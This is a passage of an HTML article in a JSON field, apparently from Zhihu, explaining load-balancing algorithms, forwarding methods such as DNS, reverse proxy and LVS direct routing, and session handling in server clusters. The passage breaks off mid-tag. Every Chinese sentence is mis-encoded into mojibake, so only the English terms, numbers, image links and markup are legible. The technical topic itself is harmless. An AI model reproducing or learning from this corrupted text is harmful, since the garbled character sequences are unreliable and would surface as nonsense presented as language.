            "content": "<p></p><h2>ä¸€ã€è´Ÿè½½å‡è¡¡</h2><p>é›†ç¾¤ä¸­çš„åº”ç”¨æœåŠ¡å™¨ï¼ˆèŠ‚ç‚¹ï¼‰é€šå¸¸è¢«è®¾è®¡æˆæ— çŠ¶æ€ï¼Œç”¨æˆ·å¯ä»¥è¯·æ±‚ä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹ã€‚</p><p>è´Ÿè½½å‡è¡¡å™¨ä¼šæ ¹æ®é›†ç¾¤ä¸­æ¯ä¸ªèŠ‚ç‚¹çš„è´Ÿè½½æƒ…å†µï¼Œå°†ç”¨æˆ·è¯·æ±‚è½¬å‘åˆ°åˆé€‚çš„èŠ‚ç‚¹ä¸Šã€‚</p><p>è´Ÿè½½å‡è¡¡å™¨å¯ä»¥ç”¨æ¥å®ç°é«˜å¯ç”¨ä»¥åŠä¼¸ç¼©æ€§ï¼š</p><ul><li>é«˜å¯ç”¨ï¼šå½“æŸä¸ªèŠ‚ç‚¹æ•…éšœæ—¶ï¼Œè´Ÿè½½å‡è¡¡å™¨ä¼šå°†ç”¨æˆ·è¯·æ±‚è½¬å‘åˆ°å¦å¤–çš„èŠ‚ç‚¹ä¸Šï¼Œä»è€Œä¿è¯æ‰€æœ‰æœåŠ¡æŒç»­å¯ç”¨ï¼›</li><li>ä¼¸ç¼©æ€§ï¼šæ ¹æ®ç³»ç»Ÿæ•´ä½“è´Ÿè½½æƒ…å†µï¼Œå¯ä»¥å¾ˆå®¹æ˜“åœ°æ·»åŠ æˆ–ç§»é™¤èŠ‚ç‚¹ã€‚</li></ul><p>è´Ÿè½½å‡è¡¡å™¨è¿è¡Œè¿‡ç¨‹åŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼š</p><ol><li>æ ¹æ®è´Ÿè½½å‡è¡¡ç®—æ³•å¾—åˆ°è½¬å‘çš„èŠ‚ç‚¹ï¼›</li><li>è¿›è¡Œè½¬å‘ã€‚</li></ol><h2>è´Ÿè½½å‡è¡¡ç®—æ³•</h2><h3>1. è½®è¯¢ï¼ˆRound Robinï¼‰</h3><p>è½®è¯¢ç®—æ³•æŠŠæ¯ä¸ªè¯·æ±‚è½®æµå‘é€åˆ°æ¯ä¸ªæœåŠ¡å™¨ä¸Šã€‚</p><p>ä¸‹å›¾ä¸­ï¼Œä¸€å…±æœ‰ 6 ä¸ªå®¢æˆ·ç«¯äº§ç”Ÿäº† 6 ä¸ªè¯·æ±‚ï¼Œè¿™ 6 ä¸ªè¯·æ±‚æŒ‰ (1, 2, 3, 4, 5, 6) çš„é¡ºåºå‘é€ã€‚(1, 3, 5) çš„è¯·æ±‚ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 1ï¼Œ(2, 4, 6) çš„è¯·æ±‚ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 2ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-3b945cbeba438d1d8bc26029b81840a7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"768\" data-rawheight=\"594\" class=\"origin_image zh-lightbox-thumb\" width=\"768\" data-original=\"https://pic4.zhimg.com/v2-3b945cbeba438d1d8bc26029b81840a7_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;768&#39; height=&#39;594&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"768\" data-rawheight=\"594\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"768\" data-original=\"https://pic4.zhimg.com/v2-3b945cbeba438d1d8bc26029b81840a7_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-3b945cbeba438d1d8bc26029b81840a7_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>è¯¥ç®—æ³•æ¯”è¾ƒé€‚åˆæ¯ä¸ªæœåŠ¡å™¨çš„æ€§èƒ½å·®ä¸å¤šçš„åœºæ™¯ï¼Œå¦‚æœæœ‰æ€§èƒ½å­˜åœ¨å·®å¼‚çš„æƒ…å†µä¸‹ï¼Œé‚£ä¹ˆæ€§èƒ½è¾ƒå·®çš„æœåŠ¡å™¨å¯èƒ½æ— æ³•æ‰¿æ‹…è¿‡å¤§çš„è´Ÿè½½ï¼ˆä¸‹å›¾çš„ Server 2ï¼‰ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-0aece687ab2b9cea0c17e53007bbfd59_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"570\" class=\"origin_image zh-lightbox-thumb\" width=\"728\" data-original=\"https://pic2.zhimg.com/v2-0aece687ab2b9cea0c17e53007bbfd59_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;728&#39; height=&#39;570&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"570\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"728\" data-original=\"https://pic2.zhimg.com/v2-0aece687ab2b9cea0c17e53007bbfd59_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-0aece687ab2b9cea0c17e53007bbfd59_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>2. åŠ æƒè½®è¯¢ï¼ˆWeighted Round Robbinï¼‰</h3><p>åŠ æƒè½®è¯¢æ˜¯åœ¨è½®è¯¢çš„åŸºç¡€ä¸Šï¼Œæ ¹æ®æœåŠ¡å™¨çš„æ€§èƒ½å·®å¼‚ï¼Œä¸ºæœåŠ¡å™¨èµ‹äºˆä¸€å®šçš„æƒå€¼ï¼Œæ€§èƒ½é«˜çš„æœåŠ¡å™¨åˆ†é…æ›´é«˜çš„æƒå€¼ã€‚</p><p>ä¾‹å¦‚ä¸‹å›¾ä¸­ï¼ŒæœåŠ¡å™¨ 1 è¢«èµ‹äºˆçš„æƒå€¼ä¸º 5ï¼ŒæœåŠ¡å™¨ 2 è¢«èµ‹äºˆçš„æƒå€¼ä¸º 1ï¼Œé‚£ä¹ˆ (1, 2, 3, 4, 5) è¯·æ±‚ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 1ï¼Œ(6) è¯·æ±‚ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 2ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-ebce95b98391a5a97519066b79889d7c_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"733\" data-rawheight=\"561\" class=\"origin_image zh-lightbox-thumb\" width=\"733\" data-original=\"https://pic1.zhimg.com/v2-ebce95b98391a5a97519066b79889d7c_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;733&#39; height=&#39;561&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"733\" data-rawheight=\"561\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"733\" data-original=\"https://pic1.zhimg.com/v2-ebce95b98391a5a97519066b79889d7c_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-ebce95b98391a5a97519066b79889d7c_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>3. æœ€å°‘è¿æ¥ï¼ˆleast Connectionsï¼‰</h3><p>ç”±äºæ¯ä¸ªè¯·æ±‚çš„è¿æ¥æ—¶é—´ä¸ä¸€æ ·ï¼Œä½¿ç”¨è½®è¯¢æˆ–è€…åŠ æƒè½®è¯¢ç®—æ³•çš„è¯ï¼Œå¯èƒ½ä¼šè®©ä¸€å°æœåŠ¡å™¨å½“å‰è¿æ¥æ•°è¿‡å¤§ï¼Œè€Œå¦ä¸€å°æœåŠ¡å™¨çš„è¿æ¥è¿‡å°ï¼Œé€ æˆè´Ÿè½½ä¸å‡è¡¡ã€‚</p><p>ä¾‹å¦‚ä¸‹å›¾ä¸­ï¼Œ(1, 3, 5) è¯·æ±‚ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 1ï¼Œä½†æ˜¯ (1, 3) å¾ˆå¿«å°±æ–­å¼€è¿æ¥ï¼Œæ­¤æ—¶åªæœ‰ (5) è¯·æ±‚è¿æ¥æœåŠ¡å™¨ 1ï¼›(2, 4, 6) è¯·æ±‚è¢«å‘é€åˆ°æœåŠ¡å™¨ 2ï¼Œåªæœ‰ (2) çš„è¿æ¥æ–­å¼€ï¼Œæ­¤æ—¶ (6, 4) è¯·æ±‚è¿æ¥æœåŠ¡å™¨ 2ã€‚è¯¥ç³»ç»Ÿç»§ç»­è¿è¡Œæ—¶ï¼ŒæœåŠ¡å™¨ 2 ä¼šæ‰¿æ‹…è¿‡å¤§çš„è´Ÿè½½ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-bcb11da0591632e4b3ba5634a70aa75d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"718\" data-rawheight=\"591\" class=\"origin_image zh-lightbox-thumb\" width=\"718\" data-original=\"https://pic2.zhimg.com/v2-bcb11da0591632e4b3ba5634a70aa75d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;718&#39; height=&#39;591&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"718\" data-rawheight=\"591\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"718\" data-original=\"https://pic2.zhimg.com/v2-bcb11da0591632e4b3ba5634a70aa75d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-bcb11da0591632e4b3ba5634a70aa75d_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>æœ€å°‘è¿æ¥ç®—æ³•å°±æ˜¯å°†è¯·æ±‚å‘é€ç»™å½“å‰æœ€å°‘è¿æ¥æ•°çš„æœåŠ¡å™¨ä¸Šã€‚</p><p>ä¾‹å¦‚ä¸‹å›¾ä¸­ï¼ŒæœåŠ¡å™¨ 1 å½“å‰è¿æ¥æ•°æœ€å°ï¼Œé‚£ä¹ˆæ–°åˆ°æ¥çš„è¯·æ±‚ 6 å°±ä¼šè¢«å‘é€åˆ°æœåŠ¡å™¨ 1 ä¸Šã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-6b426f75006a7cc2075aade42237adf7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"721\" data-rawheight=\"560\" class=\"origin_image zh-lightbox-thumb\" width=\"721\" data-original=\"https://pic4.zhimg.com/v2-6b426f75006a7cc2075aade42237adf7_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;721&#39; height=&#39;560&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"721\" data-rawheight=\"560\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"721\" data-original=\"https://pic4.zhimg.com/v2-6b426f75006a7cc2075aade42237adf7_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-6b426f75006a7cc2075aade42237adf7_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>4. åŠ æƒæœ€å°‘è¿æ¥ï¼ˆWeighted Least Connectionï¼‰</h3><p>åœ¨æœ€å°‘è¿æ¥çš„åŸºç¡€ä¸Šï¼Œæ ¹æ®æœåŠ¡å™¨çš„æ€§èƒ½ä¸ºæ¯å°æœåŠ¡å™¨åˆ†é…æƒé‡ï¼Œå†æ ¹æ®æƒé‡è®¡ç®—å‡ºæ¯å°æœåŠ¡å™¨èƒ½å¤„ç†çš„è¿æ¥æ•°ã€‚</p><h3>5. éšæœºç®—æ³•ï¼ˆRandomï¼‰</h3><p>æŠŠè¯·æ±‚éšæœºå‘é€åˆ°æœåŠ¡å™¨ä¸Šã€‚</p><p>å’Œè½®è¯¢ç®—æ³•ç±»ä¼¼ï¼Œè¯¥ç®—æ³•æ¯”è¾ƒé€‚åˆæœåŠ¡å™¨æ€§èƒ½å·®ä¸å¤šçš„åœºæ™¯ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-97daa42a790f2a0e42fa6b3f7ff4c0ea_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"700\" data-rawheight=\"566\" class=\"origin_image zh-lightbox-thumb\" width=\"700\" data-original=\"https://pic3.zhimg.com/v2-97daa42a790f2a0e42fa6b3f7ff4c0ea_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;700&#39; height=&#39;566&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"700\" data-rawheight=\"566\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"700\" data-original=\"https://pic3.zhimg.com/v2-97daa42a790f2a0e42fa6b3f7ff4c0ea_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-97daa42a790f2a0e42fa6b3f7ff4c0ea_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>6. æºåœ°å€å“ˆå¸Œæ³• (IP Hash)</h3><p>æºåœ°å€å“ˆå¸Œé€šè¿‡å¯¹å®¢æˆ·ç«¯ IP è®¡ç®—å“ˆå¸Œå€¼ä¹‹åï¼Œå†å¯¹æœåŠ¡å™¨æ•°é‡å–æ¨¡å¾—åˆ°ç›®æ ‡æœåŠ¡å™¨çš„åºå·ã€‚</p><p>å¯ä»¥ä¿è¯åŒä¸€ IP çš„å®¢æˆ·ç«¯çš„è¯·æ±‚ä¼šè½¬å‘åˆ°åŒä¸€å°æœåŠ¡å™¨ä¸Šï¼Œç”¨æ¥å®ç°ä¼šè¯ç²˜æ»ï¼ˆSticky Sessionï¼‰</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-1b2787e22b69aed6521c64c9a38d9b3f_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"777\" data-rawheight=\"595\" class=\"origin_image zh-lightbox-thumb\" width=\"777\" data-original=\"https://pic4.zhimg.com/v2-1b2787e22b69aed6521c64c9a38d9b3f_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;777&#39; height=&#39;595&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"777\" data-rawheight=\"595\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"777\" data-original=\"https://pic4.zhimg.com/v2-1b2787e22b69aed6521c64c9a38d9b3f_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-1b2787e22b69aed6521c64c9a38d9b3f_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>è½¬å‘å®ç°</h2><h3>1. HTTP é‡å®šå‘</h3><p>HTTP é‡å®šå‘è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ä½¿ç”¨æŸç§è´Ÿè½½å‡è¡¡ç®—æ³•è®¡ç®—å¾—åˆ°æœåŠ¡å™¨çš„ IP åœ°å€ä¹‹åï¼Œå°†è¯¥åœ°å€å†™å…¥ HTTP é‡å®šå‘æŠ¥æ–‡ä¸­ï¼ŒçŠ¶æ€ç ä¸º 302ã€‚å®¢æˆ·ç«¯æ”¶åˆ°é‡å®šå‘æŠ¥æ–‡ä¹‹åï¼Œéœ€è¦é‡æ–°å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ã€‚</p><p>ç¼ºç‚¹ï¼š</p><ul><li>éœ€è¦ä¸¤æ¬¡è¯·æ±‚ï¼Œå› æ­¤è®¿é—®å»¶è¿Ÿæ¯”è¾ƒé«˜ï¼›</li><li>HTTP è´Ÿè½½å‡è¡¡å™¨å¤„ç†èƒ½åŠ›æœ‰é™ï¼Œä¼šé™åˆ¶é›†ç¾¤çš„è§„æ¨¡ã€‚</li></ul><p>è¯¥è´Ÿè½½å‡è¡¡è½¬å‘çš„ç¼ºç‚¹æ¯”è¾ƒæ˜æ˜¾ï¼Œå®é™…åœºæ™¯ä¸­å¾ˆå°‘ä½¿ç”¨å®ƒã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-8cec4803cd277056378d71b4d1dd3eae_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"821\" data-rawheight=\"399\" class=\"origin_image zh-lightbox-thumb\" width=\"821\" data-original=\"https://pic3.zhimg.com/v2-8cec4803cd277056378d71b4d1dd3eae_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;821&#39; height=&#39;399&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"821\" data-rawheight=\"399\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"821\" data-original=\"https://pic3.zhimg.com/v2-8cec4803cd277056378d71b4d1dd3eae_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-8cec4803cd277056378d71b4d1dd3eae_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>2. DNS åŸŸåè§£æ</h3><p>åœ¨ DNS è§£æåŸŸåçš„åŒæ—¶ä½¿ç”¨è´Ÿè½½å‡è¡¡ç®—æ³•è®¡ç®—æœåŠ¡å™¨ IP åœ°å€ã€‚</p><p>ä¼˜ç‚¹ï¼š</p><ul><li>DNS èƒ½å¤Ÿæ ¹æ®åœ°ç†ä½ç½®è¿›è¡ŒåŸŸåè§£æï¼Œè¿”å›ç¦»ç”¨æˆ·æœ€è¿‘çš„æœåŠ¡å™¨ IP åœ°å€ã€‚</li></ul><p>ç¼ºç‚¹ï¼š</p><ul><li>ç”±äº DNS å…·æœ‰å¤šçº§ç»“æ„ï¼Œæ¯ä¸€çº§çš„åŸŸåè®°å½•éƒ½å¯èƒ½è¢«ç¼“å­˜ï¼Œå½“ä¸‹çº¿ä¸€å°æœåŠ¡å™¨éœ€è¦ä¿®æ”¹ DNS è®°å½•æ—¶ï¼Œéœ€è¦è¿‡å¾ˆé•¿ä¸€æ®µæ—¶é—´æ‰èƒ½ç”Ÿæ•ˆã€‚</li></ul><p>å¤§å‹ç½‘ç«™åŸºæœ¬ä½¿ç”¨äº† DNS åšä¸ºç¬¬ä¸€çº§è´Ÿè½½å‡è¡¡æ‰‹æ®µï¼Œç„¶ååœ¨å†…éƒ¨ä½¿ç”¨å…¶å®ƒæ–¹å¼åšç¬¬äºŒçº§è´Ÿè½½å‡è¡¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒåŸŸåè§£æçš„ç»“æœä¸ºå†…éƒ¨çš„è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ IP åœ°å€ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-af25505fa3b5bfe22edccd0b0c20f6d6_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"820\" data-rawheight=\"416\" class=\"origin_image zh-lightbox-thumb\" width=\"820\" data-original=\"https://pic3.zhimg.com/v2-af25505fa3b5bfe22edccd0b0c20f6d6_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;820&#39; height=&#39;416&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"820\" data-rawheight=\"416\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"820\" data-original=\"https://pic3.zhimg.com/v2-af25505fa3b5bfe22edccd0b0c20f6d6_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-af25505fa3b5bfe22edccd0b0c20f6d6_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>3. åå‘ä»£ç†æœåŠ¡å™¨</h3><p>åå‘ä»£ç†æœåŠ¡å™¨ä½äºæºæœåŠ¡å™¨å‰é¢ï¼Œç”¨æˆ·çš„è¯·æ±‚éœ€è¦å…ˆç»è¿‡åå‘ä»£ç†æœåŠ¡å™¨æ‰èƒ½åˆ°è¾¾æºæœåŠ¡å™¨ã€‚åå‘ä»£ç†å¯ä»¥ç”¨æ¥è¿›è¡Œç¼“å­˜ã€æ—¥å¿—è®°å½•ç­‰ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ç”¨æ¥åšä¸ºè´Ÿè½½å‡è¡¡æœåŠ¡å™¨ã€‚</p><p>åœ¨è¿™ç§è´Ÿè½½å‡è¡¡è½¬å‘æ–¹å¼ä¸‹ï¼Œå®¢æˆ·ç«¯ä¸ç›´æ¥è¯·æ±‚æºæœåŠ¡å™¨ï¼Œå› æ­¤æºæœåŠ¡å™¨ä¸éœ€è¦å¤–éƒ¨ IP åœ°å€ï¼Œè€Œåå‘ä»£ç†éœ€è¦é…ç½®å†…éƒ¨å’Œå¤–éƒ¨ä¸¤å¥— IP åœ°å€ã€‚</p><p>ä¼˜ç‚¹ï¼š</p><ul><li>ä¸å…¶å®ƒåŠŸèƒ½é›†æˆåœ¨ä¸€èµ·ï¼Œéƒ¨ç½²ç®€å•ã€‚</li></ul><p>ç¼ºç‚¹ï¼š</p><ul><li>æ‰€æœ‰è¯·æ±‚å’Œå“åº”éƒ½éœ€è¦ç»è¿‡åå‘ä»£ç†æœåŠ¡å™¨ï¼Œå®ƒå¯èƒ½ä¼šæˆä¸ºæ€§èƒ½ç“¶é¢ˆã€‚</li></ul><h3>4. ç½‘ç»œå±‚</h3><p>åœ¨æ“ä½œç³»ç»Ÿå†…æ ¸è¿›ç¨‹è·å–ç½‘ç»œæ•°æ®åŒ…ï¼Œæ ¹æ®è´Ÿè½½å‡è¡¡ç®—æ³•è®¡ç®—æºæœåŠ¡å™¨çš„ IP åœ°å€ï¼Œå¹¶ä¿®æ”¹è¯·æ±‚æ•°æ®åŒ…çš„ç›®çš„ IP åœ°å€ï¼Œæœ€åè¿›è¡Œè½¬å‘ã€‚</p><p>æºæœåŠ¡å™¨è¿”å›çš„å“åº”ä¹Ÿéœ€è¦ç»è¿‡è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ï¼Œé€šå¸¸æ˜¯è®©è´Ÿè½½å‡è¡¡æœåŠ¡å™¨åŒæ—¶ä½œä¸ºé›†ç¾¤çš„ç½‘å…³æœåŠ¡å™¨æ¥å®ç°ã€‚</p><p>ä¼˜ç‚¹ï¼š</p><ul><li>åœ¨å†…æ ¸è¿›ç¨‹ä¸­è¿›è¡Œå¤„ç†ï¼Œæ€§èƒ½æ¯”è¾ƒé«˜ã€‚</li></ul><p>ç¼ºç‚¹ï¼š</p><ul><li>å’Œåå‘ä»£ç†ä¸€æ ·ï¼Œæ‰€æœ‰çš„è¯·æ±‚å’Œå“åº”éƒ½ç»è¿‡è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ï¼Œä¼šæˆä¸ºæ€§èƒ½ç“¶é¢ˆã€‚</li></ul><h3>5. é“¾è·¯å±‚</h3><p>åœ¨é“¾è·¯å±‚æ ¹æ®è´Ÿè½½å‡è¡¡ç®—æ³•è®¡ç®—æºæœåŠ¡å™¨çš„ MAC åœ°å€ï¼Œå¹¶ä¿®æ”¹è¯·æ±‚æ•°æ®åŒ…çš„ç›®çš„ MAC åœ°å€ï¼Œå¹¶è¿›è¡Œè½¬å‘ã€‚</p><p>é€šè¿‡é…ç½®æºæœåŠ¡å™¨çš„è™šæ‹Ÿ IP åœ°å€å’Œè´Ÿè½½å‡è¡¡æœåŠ¡å™¨çš„ IP åœ°å€ä¸€è‡´ï¼Œä»è€Œä¸éœ€è¦ä¿®æ”¹ IP åœ°å€å°±å¯ä»¥è¿›è¡Œè½¬å‘ã€‚ä¹Ÿæ­£å› ä¸º IP åœ°å€ä¸€æ ·ï¼Œæ‰€ä»¥æºæœåŠ¡å™¨çš„å“åº”ä¸éœ€è¦è½¬å‘å›è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ï¼Œå¯ä»¥ç›´æ¥è½¬å‘ç»™å®¢æˆ·ç«¯ï¼Œé¿å…äº†è´Ÿè½½å‡è¡¡æœåŠ¡å™¨çš„æˆä¸ºç“¶é¢ˆã€‚</p><p>è¿™æ˜¯ä¸€ç§ä¸‰è§’ä¼ è¾“æ¨¡å¼ï¼Œè¢«ç§°ä¸ºç›´æ¥è·¯ç”±ã€‚å¯¹äºæä¾›ä¸‹è½½å’Œè§†é¢‘æœåŠ¡çš„ç½‘ç«™æ¥è¯´ï¼Œç›´æ¥è·¯ç”±é¿å…äº†å¤§é‡çš„ç½‘ç»œä¼ è¾“æ•°æ®ç»è¿‡è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ã€‚</p><p>è¿™æ˜¯ç›®å‰å¤§å‹ç½‘ç«™ä½¿ç”¨æœ€å¹¿è´Ÿè½½å‡è¡¡è½¬å‘æ–¹å¼ï¼Œåœ¨ Linux å¹³å°å¯ä»¥ä½¿ç”¨çš„è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ä¸º LVSï¼ˆLinux Virtual Serverï¼‰ã€‚</p><p>å‚è€ƒï¼š</p><ul><li><a href=\"https://link.zhihu.com/?target=http%3A//www.jscape.com/blog/load-balancing-algorithms\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Comparing Load Balancing Algorithms</a></li><li><a href=\"https://link.zhihu.com/?target=http%3A//slideplayer.com/slide/6599069/%23\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Redirection and Load Balancing</a></li></ul><h2>äºŒã€é›†ç¾¤ä¸‹çš„ Session ç®¡ç†</h2><p>ä¸€ä¸ªç”¨æˆ·çš„ Session ä¿¡æ¯å¦‚æœå­˜å‚¨åœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œé‚£ä¹ˆå½“è´Ÿè½½å‡è¡¡å™¨æŠŠç”¨æˆ·çš„ä¸‹ä¸€ä¸ªè¯·æ±‚è½¬å‘åˆ°å¦ä¸€ä¸ªæœåŠ¡å™¨ï¼Œç”±äºæœåŠ¡å™¨æ²¡æœ‰ç”¨æˆ·çš„ Session ä¿¡æ¯ï¼Œé‚£ä¹ˆè¯¥ç”¨æˆ·å°±éœ€è¦é‡æ–°è¿›è¡Œç™»å½•ç­‰æ“ä½œã€‚</p><h2>Sticky Session</h2><p>éœ€è¦é…ç½®è´Ÿè½½å‡è¡¡å™¨ï¼Œä½¿å¾—ä¸€ä¸ªç”¨æˆ·çš„æ‰€æœ‰è¯·æ±‚éƒ½è·¯ç”±åˆ°åŒä¸€ä¸ªæœåŠ¡å™¨ï¼Œè¿™æ ·å°±å¯ä»¥æŠŠç”¨æˆ·çš„ Session å­˜æ”¾åœ¨è¯¥æœåŠ¡å™¨ä¸­ã€‚</p><p>ç¼ºç‚¹ï¼š</p><ul><li>å½“æœåŠ¡å™¨å®•æœºæ—¶ï¼Œå°†ä¸¢å¤±è¯¥æœåŠ¡å™¨ä¸Šçš„æ‰€æœ‰ Sessionã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-b6783034eb0e2b5bcac8ef8f4a54d47b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"716\" data-rawheight=\"520\" class=\"origin_image zh-lightbox-thumb\" width=\"716\" data-original=\"https://pic4.zhimg.com/v2-b6783034eb0e2b5bcac8ef8f4a54d47b_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;716&#39; height=&#39;520&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"716\" data-rawheight=\"520\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"716\" data-original=\"https://pic4.zhimg.com/v2-b6783034eb0e2b5bcac8ef8f4a54d47b_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-b6783034eb0e2b5bcac8ef8f4a54d47b_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>Session Replication</h2><p>åœ¨æœåŠ¡å™¨ä¹‹é—´è¿›è¡Œ Session åŒæ­¥æ“ä½œï¼Œæ¯ä¸ªæœåŠ¡å™¨éƒ½æœ‰æ‰€æœ‰ç”¨æˆ·çš„ Session ä¿¡æ¯ï¼Œå› æ­¤ç”¨æˆ·å¯ä»¥å‘ä»»ä½•ä¸€ä¸ªæœåŠ¡å™¨è¿›è¡Œè¯·æ±‚ã€‚</p><p>ç¼ºç‚¹ï¼š</p><ul><li>å ç”¨è¿‡å¤šå†…å­˜ï¼›</li><li>åŒæ­¥è¿‡ç¨‹å ç”¨ç½‘ç»œå¸¦å®½ä»¥åŠæœåŠ¡å™¨å¤„ç†å™¨æ—¶é—´ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-83a40112583526f55e3a9f87f9400d41_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"701\" data-rawheight=\"683\" class=\"origin_image zh-lightbox-thumb\" width=\"701\" data-original=\"https://pic2.zhimg.com/v2-83a40112583526f55e3a9f87f9400d41_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;701&#39; height=&#39;683&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" 